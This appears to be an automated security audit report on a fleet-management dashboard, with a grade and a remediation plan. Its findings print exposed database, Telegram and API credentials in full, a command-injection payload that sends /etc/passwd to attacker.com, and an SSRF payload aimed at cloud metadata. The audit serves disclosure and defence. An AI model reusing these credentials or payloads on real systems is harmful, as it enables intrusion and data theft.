# SkyNet (Fleet Dashboard) - Production Readiness Review

**Date:** February 14, 2026  
**Reviewer:** ArchitectoBot  
**Project:** XDC SkyNet - Fleet Management Dashboard  
**Repository:** AnilChinchawale/XDCNetOwn  

---

## Executive Summary

| Metric | Value |
|--------|-------|
| **Overall Grade** | C+ |
| **Security Score** | 42/100 |
| **Production Ready?** | ❌ **NO** |

### Critical Issue Count
- 🔴 **3 Critical** - Secrets in code, auth bypasses, RCE vectors
- 🟠 **5 High** - Missing auth, SSRF, injection vulnerabilities  
- 🟡 **9 Medium** - Dev mode in prod, missing rate limits, poor error handling
- 🔵 **12 Low** - Code quality, logging, documentation gaps

---

## Scoring Breakdown

| Category | Points | Score | Notes |
|----------|--------|-------|-------|
| **SSL/TLS Everywhere** | 10 | 5 | HTTPS on public site, but no cert pinning, internal comms not TLS |
| **Authentication & Authorization** | 15 | 5 | Auth bypass on read endpoints, no RBAC, weak API keys |
| **Input Validation** | 10 | 6 | Good Zod schemas, but inconsistent application |
| **Error Handling & Boundaries** | 10 | 5 | Some error boundaries, leaks internals in errors |
| **Logging & Monitoring** | 10 | 7 | Structured logging, request IDs, but gaps |
| **Database Maintenance** | 10 | 2 | No retention, no partitions, no backups configured |
| **CI/CD Pipeline** | 10 | 2 | No evidence of automated testing/deployment |
| **Load Testing** | 10 | 0 | No load testing evidence |
| **Documentation** | 10 | 5 | API docs exist, ops docs minimal |
| **Disaster Recovery** | 10 | 5 | No documented DR plan |
| **TOTAL** | 100 | **42** | |

---

## Critical Vulnerabilities (🔴 P0)

### C1: Secrets Committed to Code
**Location:** `.env` file in repository

```bash
# Hardcoded production secrets
DATABASE_URL=postgresql://gateway:gateway_secret_2026@localhost:5443/xdc_gateway
TELEGRAM_BOT_TOKEN=8294325603:AAHk9vUS4zIeUGnaxmhw8EI1qwbzXazd81Q
API_KEYS=xdc-netown-key-2026-prod,xdc-netown-key-2026-test
```

**Impact:**
- Database credentials exposed
- Telegram bot compromised (can send/receive messages)
- API keys allow fleet management access

**Remediation:**
1. Rotate ALL secrets immediately
2. Add `.env` to `.gitignore`
3. Use proper secret management (HashiCorp Vault, AWS Secrets Manager, or at least environment-only)
4. Enable GitHub secret scanning

---

### C2: Remote Code Execution via GitHub Issue Creation
**Location:** `app/api/v1/issues/report/route.ts`

```typescript
function createGitHubIssue(...) {
  const safeTitle = title.replace(/"/g, '\\"').replace(/`/g, '\\`').slice(0, 200);
  execSync(
    `gh issue create --repo ${repo} --title "${safeTitle}" ...`,
    { timeout: 30000 }
  )
}
```

**Bypass:**
```javascript
// Title payload: $(curl attacker.com/exfil?data=$(cat /etc/passwd))
// After replacement: $(curl attacker.com/exfil?data=$(cat /etc/passwd))
// Result: Command substitution executes!
```

**Impact:** Full server compromise possible.

---

### C3: Authentication Bypass on Read Endpoints
**Location:** `lib/auth.ts`

```typescript
export function isDashboardReadRequest(req: NextRequest): boolean {
  return req.method === 'GET' && !req.headers.get('authorization');
}
```

**Unauthenticated Endpoints:**
| Endpoint | Risk | Data Exposed |
|----------|------|--------------|
| `GET /api/nodes` | 🔴 High | All node IPs, roles, metadata |
| `GET /api/v1/network/health` | 🟡 Low | Network statistics |
| `GET /api/v1/masternodes` | 🟡 Low | Masternode list |
| `GET /api/v1/peers/healthy` | 🟡 Low | Peer enodes |

---

## High Severity Vulnerabilities (🟠 P1)

### H1: SSRF via User-Controlled URLs
**Location:** `app/api/diagnostics/route.ts`

```typescript
// node.host from database, but no validation it's an internal address
const response = await fetch(node.host, {
  method: 'POST',
  ...
});
```

**Attack:** Register node with `host=http://169.254.169.254/latest/meta-data/` (AWS metadata)

---

### H2: No Rate Limiting
**Location:** `middleware.ts`

```typescript
// Rate limiting disabled for now
// TODO: Re-enable when production traffic warrants it
```

---

### H3: WebSocket No Authentication
**Location:** `ws-server.ts`

```typescript
wss.on('connection', (ws) => {
  // No authentication check!
  clientSubscriptions.set(ws, new Set(['metrics', 'incidents', 'peers', 'health']));
```

---

### H4: Insecure CORS Configuration
**Location:** `middleware.ts`

Default allows all origins (`*`) if env var not set.

---

### H5: Information Disclosure via Error Messages
Multiple locations leak internal details (file paths, DB structure) in error responses.

---

## Architecture Concerns

### Database Issues
- **No data retention policy:** Metrics table will grow unbounded
- **Missing partitioning:** Large tables should be time-partitioned
- **No archival strategy:** Old data never purged
- **N+1 Queries:** `app/api/nodes/route.ts` - O(n) queries for n nodes

### Performance Issues
- **Unbounded Queries:** Max limit is 1000 but no time bounds
- **Memory Leaks:** WS clientSubscriptions Map grows indefinitely

### Deployment Issues
- No horizontal scaling strategy
- No graceful shutdown handling

---

## Prioritized Action Plan

### Immediate Actions (This Week)

| Priority | Issue | Effort |
|----------|-------|--------|
| P0 | Rotate all exposed secrets | 2h |
| P0 | Remove .env from git history | 1h |
| P0 | Enable auth on all read endpoints | 4h |
| P0 | Fix command injection in issues/report | 2h |

### Short Term (This Month)

| Priority | Issue | Effort |
|----------|-------|--------|
| P1 | Implement rate limiting | 4h |
| P1 | Add WebSocket authentication | 6h |
| P1 | Add request validation to all routes | 8h |
| P1 | Implement data retention policies | 4h |
| P1 | Add security headers to all responses | 2h |
| P1 | Fix SSRF in node.host validation | 3h |

### Medium Term (Next Quarter)

| Priority | Issue | Effort |
|----------|-------|--------|
| P2 | Implement proper secret management | 16h |
| P2 | Add comprehensive audit logging | 12h |
| P2 | Set up CI/CD with security scanning | 16h |
| P2 | Implement RBAC | 24h |
| P2 | Database partitioning | 16h |

---

## Compliance Status

| Requirement | Status | Notes |
|-------------|--------|-------|
| SOC 2 Type II | ❌ Fail | No audit logging, access controls weak |
| ISO 27001 | ❌ Fail | No risk assessment, incident response |
| GDPR (EU) | ⚠️ Partial | Data retention not defined |

---

## Conclusion

**Do NOT deploy SkyNet to production until P0 items are resolved.**

The project shows good architectural foundations with TypeScript, Zod validation, and proper DB layer separation. However, critical security vulnerabilities including exposed secrets, authentication bypasses, and RCE vectors make it unsuitable for production deployment.

---

*Report generated by ArchitectoBot - February 14, 2026*
